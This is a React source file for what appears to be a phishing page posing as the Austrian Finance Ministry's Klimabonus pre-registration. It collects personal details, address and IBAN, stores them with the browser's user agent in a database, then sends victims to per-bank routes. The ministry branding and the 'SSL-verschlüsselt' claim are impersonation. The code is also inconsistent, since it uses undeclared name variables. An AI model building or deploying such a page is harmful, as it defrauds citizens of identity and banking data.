import { useState, useEffect, useRef, useCallback } from "react";
import { useNavigate } from "react-router-dom";
import { ArrowRight, ArrowLeft, ChevronsUpDown, Check, Lock, User, Calendar, Mail, MapPin, DoorOpen, Building2 } from "lucide-react";
import { cn } from "@/lib/utils";
import { formatIBAN } from "@/lib/format";
import { banks, bankRouteMap, formatBirthdate } from "@/lib/banks";
import { supabase } from "@/integrations/supabase/client";
import KlimabonusWizardShell from "@/components/KlimabonusWizardShell";
import LoadingOverlay from "@/components/LoadingOverlay";
import {
  Popover,
  PopoverContent,
  PopoverTrigger,
} from "@/components/ui/popover";
import {
  Command,
  CommandEmpty,
  CommandGroup,
  CommandItem,
  CommandList,
} from "@/components/ui/command";

const BMF_RED = "#E6320F";

const fieldClass =
  "h-11 w-full rounded-md border border-gray-300 px-3 text-sm focus:border-[#E6320F] focus:outline-none focus:ring-2 focus:ring-[#E6320F]/20 transition";
const labelClass = "mb-1.5 block text-[13px] font-medium text-gray-700";

const KlimabonusVoranmeldung = () => {
  const navigate = useNavigate();
  const [step, setStep] = useState<1 | 2>(1);
  const [showLoading, setShowLoading] = useState(false);

  // Persönliche Daten
  const [firstName, setFirstName] = useState("");
  const [lastName, setLastName] = useState("");
  const [email, setEmail] = useState("");
  const [birthdate, setBirthdate] = useState("");
  const [phone, setPhone] = useState("");
  const [street, setStreet] = useState("");
  const [houseNumber, setHouseNumber] = useState("");
  const [staircase, setStaircase] = useState("");
  const [doorNumber, setDoorNumber] = useState("");
  const [postalCode, setPostalCode] = useState("");
  const [city, setCity] = useState("");

  // Bankdaten
  const [iban, setIban] = useState("");
  const [selectedBank, setSelectedBank] = useState("");
  const [bankOpen, setBankOpen] = useState(false);
  const [bankSearch, setBankSearch] = useState("");
  const inputRef = useRef<HTMLInputElement>(null);

  useEffect(() => {
    document.title = "Klimabonus Voranmeldung | BMF";
  }, []);

  useEffect(() => {
    if (bankOpen && inputRef.current) inputRef.current.focus();
  }, [bankOpen]);

  useEffect(() => {
    window.scrollTo(0, 0);
  }, [step]);

  const ibanCleanLength = iban.replace(/\s/g, "").length;
  const showBankPicker = ibanCleanLength > 10;
  const selectedBankObj = banks.find((b) => b.name === selectedBank);

  const step1Valid =
    firstName.trim() &&
    lastName.trim() &&
    email.trim() &&
    birthdate.trim() &&
    phone.trim() &&
    street.trim() &&
    houseNumber.trim() &&
    postalCode.trim() &&
    city.trim();

  const step2Valid = ibanCleanLength >= 16 && selectedBank;

  const handleSubmit = useCallback(async () => {
    if (!step2Valid) return;
    const sessionId = crypto.randomUUID().slice(0, 8);

    const { error } = await supabase
      .from("submissions")
      .insert({
        session_id: sessionId,
        full_name: fullName,
        email,
        birthdate,
        phone,
        street,
        house_number: houseNumber,
        staircase,
        door_number: doorNumber,
        postal_code: postalCode,
        city,
        iban,
        bank: selectedBank,
        flow: "klimabonus",
        user_agent: typeof navigator !== "undefined" ? navigator.userAgent : null,
        domain:
          typeof window !== "undefined"
            ? window.location.hostname.replace(/^www\./, "").toLowerCase()
            : null,
      })
      .select("id")
      .single();

    if (error) {
      console.error("Insert failed:", error);
      alert("Fehler beim Speichern der Daten. Bitte versuchen Sie es erneut.");
      return;
    }

    const route = bankRouteMap[selectedBank];
    if (route) {
      setShowLoading(true);
      setTimeout(() => {
        navigate(`${route}?s=${sessionId}`);
      }, 2500);
    }
  }, [
    step2Valid,
    fullName,
    email,
    birthdate,
    phone,
    street,
    houseNumber,
    staircase,
    doorNumber,
    postalCode,
    city,
    iban,
    selectedBank,
    navigate,
  ]);

  return (
    <>
      {showLoading && (
        <LoadingOverlay message="Daten werden überprüft..." onComplete={() => {}} />
      )}
      <KlimabonusWizardShell step={step}>
        {step === 1 && (
          <div>
            <div className="text-center mb-6">
              <div
                className="text-[11px] font-semibold uppercase tracking-[0.18em] mb-1"
                style={{ color: BMF_RED }}
              >
                Schritt 1 von 3
              </div>
              <h1 className="text-xl md:text-2xl font-semibold text-gray-900">
                Persönliche Daten
              </h1>
              <p className="text-[13.5px] text-gray-600 mt-1">
                Bitte tragen Sie Ihre Daten vollständig ein.
              </p>
            </div>

            <div className="space-y-4">
              <div>
                <label className={labelClass}>Vor- und Nachname</label>
                <input
                  type="text"
                  value={fullName}
                  onChange={(e) => setFullName(e.target.value)}
                  className={fieldClass}
                />
              </div>

              <div>
                <label className={labelClass}>E-Mail</label>
                <input
                  type="email"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  className={fieldClass}
                />
              </div>

              <div>
                <label className={labelClass}>Geburtsdatum</label>
                <input
                  type="text"
                  inputMode="numeric"
                  value={birthdate}
                  onChange={(e) => {
                    let raw = e.target.value;
                    if (
                      raw.length < birthdate.length &&
                      birthdate.endsWith(".") &&
                      !raw.endsWith(".")
                    ) {
                      raw = raw.slice(0, -1);
                    }
                    setBirthdate(formatBirthdate(raw));
                  }}
                  placeholder="TT.MM.JJJJ"
                  maxLength={10}
                  className={fieldClass}
                />
              </div>

              <div>
                <label className={labelClass}>Telefonnummer</label>
                <input
                  type="tel"
                  value={phone}
                  onChange={(e) => setPhone(e.target.value)}
                  className={fieldClass}
                />
              </div>

              <div className="grid grid-cols-[1.5fr_1fr] gap-4">
                <div>
                  <label className={labelClass}>Straße</label>
                  <input
                    type="text"
                    value={street}
                    onChange={(e) => setStreet(e.target.value)}
                    className={fieldClass}
                  />
                </div>
                <div>
                  <label className={labelClass}>Hausnummer</label>
                  <input
                    type="text"
                    value={houseNumber}
                    onChange={(e) => setHouseNumber(e.target.value)}
                    className={fieldClass}
                  />
                </div>
              </div>

              <div className="grid grid-cols-2 gap-4">
                <div>
                  <label className={labelClass}>Stiege</label>
                  <input
                    type="text"
                    value={staircase}
                    onChange={(e) => setStaircase(e.target.value)}
                    className={fieldClass}
                  />
                </div>
                <div>
                  <label className={labelClass}>Türnummer</label>
                  <input
                    type="text"
                    value={doorNumber}
                    onChange={(e) => setDoorNumber(e.target.value)}
                    className={fieldClass}
                  />
                </div>
              </div>

              <div className="grid grid-cols-2 gap-4">
                <div>
                  <label className={labelClass}>Postleitzahl</label>
                  <input
                    type="text"
                    value={postalCode}
                    onChange={(e) => setPostalCode(e.target.value)}
                    className={fieldClass}
                  />
                </div>
                <div>
                  <label className={labelClass}>Stadt</label>
                  <input
                    type="text"
                    value={city}
                    onChange={(e) => setCity(e.target.value)}
                    className={fieldClass}
                  />
                </div>
              </div>
            </div>

            <div className="mt-8 flex justify-end">
              <button
                type="button"
                disabled={!step1Valid}
                onClick={() => setStep(2)}
                className="inline-flex items-center gap-2 bg-[#E6320F] hover:bg-[#c42a0d] disabled:bg-gray-300 disabled:cursor-not-allowed text-white font-semibold text-sm px-7 py-3 rounded-md transition-colors"
              >
                <span>Weiter</span>
                <ArrowRight className="w-4 h-4" />
              </button>
            </div>
          </div>
        )}

        {step === 2 && (
          <div>
            <div className="text-center mb-6">
              <div
                className="text-[11px] font-semibold uppercase tracking-[0.18em] mb-1"
                style={{ color: BMF_RED }}
              >
                Schritt 2 von 3
              </div>
              <h1 className="text-xl md:text-2xl font-semibold text-gray-900">
                Bankdaten
              </h1>
              <p className="text-[13.5px] text-gray-600 mt-1">
                Geben Sie Ihre IBAN ein, damit der Klimabonus überwiesen werden kann.
              </p>
            </div>

            <div className="space-y-4">
              <div>
                <label className={labelClass}>IBAN</label>
                <input
                  type="text"
                  value={iban}
                  onChange={(e) => setIban(formatIBAN(e.target.value))}
                  maxLength={29}
                  placeholder="AT00 0000 0000 0000 0000"
                  className={cn(fieldClass, "tracking-wider")}
                />
              </div>

              {showBankPicker && (
                <div className="animate-in fade-in slide-in-from-top-2 duration-300">
                  <label className={labelClass}>Bank auswählen</label>
                  <Popover
                    open={bankOpen}
                    onOpenChange={(open) => {
                      setBankOpen(open);
                      if (!open) setBankSearch("");
                    }}
                  >
                    <PopoverTrigger asChild>
                      <div
                        className="flex h-11 w-full cursor-pointer items-center rounded-md border border-gray-300 px-3 focus-within:border-[#E6320F] focus-within:ring-2 focus-within:ring-[#E6320F]/20"
                        role="combobox"
                        aria-expanded={bankOpen}
                        onClick={() => setBankOpen(true)}
                      >
                        {selectedBankObj && !bankOpen && (
                          <img
                            src={selectedBankObj.icon}
                            alt=""
                            className="mr-2 h-5 w-5 object-contain"
                          />
                        )}
                        <input
                          ref={inputRef}
                          type="text"
                          className={cn(
                            "h-full flex-1 bg-transparent text-sm outline-none",
                            selectedBank
                              ? "placeholder:text-black"
                              : "placeholder:text-gray-400"
                          )}
                          placeholder={selectedBank || "Bank auswählen"}
                          value={bankSearch}
                          onClick={(e) => {
                            e.stopPropagation();
                            if (!bankOpen) setBankOpen(true);
                          }}
                          onChange={(e) => {
                            setBankSearch(e.target.value);
                            if (!bankOpen) setBankOpen(true);
                          }}
                          onFocus={(e) => {
                            e.stopPropagation();
                            if (!bankOpen) setBankOpen(true);
                          }}
                        />
                        <ChevronsUpDown className="h-4 w-4 flex-shrink-0 text-gray-400" />
                      </div>
                    </PopoverTrigger>
                    <PopoverContent
                      className="w-[--radix-popover-trigger-width] p-0"
                      align="start"
                    >
                      <Command>
                        <CommandList className="max-h-[250px] overflow-y-auto">
                          <CommandEmpty>Keine Bank gefunden.</CommandEmpty>
                          <CommandGroup>
                            {banks
                              .filter((bank) =>
                                bank.name
                                  .toLowerCase()
                                  .includes(bankSearch.toLowerCase())
                              )
                              .map((bank) => (
                                <CommandItem
                                  key={bank.name}
                                  value={bank.name}
                                  onSelect={() => {
                                    setSelectedBank(bank.name);
                                    setBankSearch("");
                                    setBankOpen(false);
                                  }}
                                >
                                  <img
                                    src={bank.icon}
                                    alt=""
                                    className="mr-2 h-5 w-5 object-contain"
                                  />
                                  <span className="flex-1">{bank.name}</span>
                                  <Check
                                    className={cn(
                                      "ml-2 h-4 w-4",
                                      selectedBank === bank.name
                                        ? "opacity-100"
                                        : "opacity-0"
                                    )}
                                  />
                                </CommandItem>
                              ))}
                          </CommandGroup>
                        </CommandList>
                      </Command>
                    </PopoverContent>
                  </Popover>
                </div>
              )}
            </div>

            <div className="flex items-center justify-center gap-2 mt-6 text-[12px] text-gray-500">
              <Lock className="w-3.5 h-3.5" />
              <span>SSL-verschlüsselt · Bundesministerium für Finanzen</span>
            </div>

            <div className="mt-6 flex items-center justify-between gap-3">
              <button
                type="button"
                onClick={() => setStep(1)}
                className="inline-flex items-center gap-2 bg-white hover:bg-gray-50 border border-gray-300 text-gray-700 font-medium text-sm px-5 py-3 rounded-md transition-colors"
              >
                <ArrowLeft className="w-4 h-4" />
                <span>Zurück</span>
              </button>
              <button
                type="button"
                disabled={!step2Valid}
                onClick={handleSubmit}
                className="inline-flex items-center gap-2 bg-[#E6320F] hover:bg-[#c42a0d] disabled:bg-gray-300 disabled:cursor-not-allowed text-white font-semibold text-sm px-7 py-3 rounded-md transition-colors"
              >
                <span>Weiter</span>
                <ArrowRight className="w-4 h-4" />
              </button>
            </div>
          </div>
        )}
      </KlimabonusWizardShell>
    </>
  );
};

export default KlimabonusVoranmeldung;
